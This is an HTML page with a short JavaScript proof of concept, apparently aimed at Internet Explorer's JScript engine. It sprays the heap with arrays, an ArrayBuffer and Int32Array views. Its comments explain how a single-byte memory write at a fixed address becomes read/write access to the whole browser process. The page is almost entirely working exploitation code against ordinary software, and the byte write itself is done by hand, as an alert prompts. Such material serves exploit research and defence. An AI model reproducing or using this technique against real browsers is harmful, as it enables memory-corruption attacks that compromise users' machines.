<html>
<head>
<script language="javascript">
  (function() {
    alert("Starting!");

    //-----------------------------------------------------
    // From one-byte-write to full process space read/write
    //-----------------------------------------------------
 
    a = new Array();
 
    // 8-byte header | 0x58-byte LargeHeapBlock
    // 8-byte header | 0x58-byte LargeHeapBlock
    // 8-byte header | 0x58-byte LargeHeapBlock
    // .
    // .
    // .
    // 8-byte header | 0x58-byte LargeHeapBlock
    // 8-byte header | 0x58-byte ArrayBuffer (buf)
    // 8-byte header | 0x58-byte LargeHeapBlock
    // .
    // .
    // .
    for (i = 0; i < 0x200; ++i) {
      a[i] = new Array(0x3c00);
      if (i == 0x80)
        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
      for (j = 0; j < a[i].length; ++j)
        a[i][j] = 0x123;
    }
    
    //    0x0:  ArrayDataHead
    //   0x20:  array[0] address
    //   0x24:  array[1] address
    //   ...
    // 0xf000:  Int32Array
    // 0xf030:  Int32Array
    //   ...
    // 0xffc0:  Int32Array
    // 0xfff0:  align data
    for (; i < 0x200 + 0x400; ++i) {
      a[i] = new Array(0x3bf8)
      for (j = 0; j < 0x55; ++j)
        a[i][j] = new Int32Array(buf)
    }
    
    //            vftptr
    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
    // 0c0af020: 03133de0                                             array_len buf_addr
    //          jsArrayBuf
    alert("Set byte at 0c0af01b to 0x20");
    
    alert("All done!");
  })();

</script>
</head>
<body>
</body>
</html>
